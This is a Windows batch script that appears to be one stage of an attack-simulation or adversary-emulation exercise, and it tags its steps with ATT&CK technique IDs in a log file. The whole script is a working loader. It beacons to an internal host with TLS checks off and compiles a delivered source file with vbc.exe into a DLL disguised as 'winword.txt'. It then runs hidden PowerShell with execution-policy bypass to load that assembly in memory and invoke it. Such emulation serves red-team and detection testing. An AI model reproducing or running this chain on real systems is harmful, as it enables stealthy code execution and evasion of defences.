@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\10100\1cc4899f
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?10100-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=winword.txt
SET njozco=file.txt
SET kkjwr=10100
SET jxngc=%APPDATA%\%ufeybybm%\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_start=>> "!jxngc!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_complete=200>> "!jxngc!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_start=!recnn!>> "!jxngc!" 2>nul
cd /d "!recnn!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_result=%errorlevel%>> "!jxngc!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_start=!njozco!>> "!jxngc!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\vbc.exe /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
SET fgy=0
IF EXIST "!hpnjatpj!" (SET fgy=1)
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1500|Compile After Delivery=!fgy!:>> "!jxngc!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_result=!fgy!>> "!jxngc!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: execution_start=powershell>> "!jxngc!" 2>nul
powershell.exe -nop -w hidden -ep bypass -Command "& { $asm=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')); $method=$null; foreach($type in $asm.GetExportedTypes()) { $method=$type.GetMethods([Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)[0]; if($method) { break; } }; if($method) { $method.Invoke($null, $null) } }"
SET vmg=1
IF !ERRORLEVEL! NEQ 0 (SET vmg=0&SET txj=exitcode_!ERRORLEVEL!)
IF !ERRORLEVEL! EQU 0 (SET txj=)
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1218|Signed Binary Proxy Execution=!vmg!:!txj!>> "!jxngc!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: execution_result=!vmg!>> "!jxngc!" 2>nul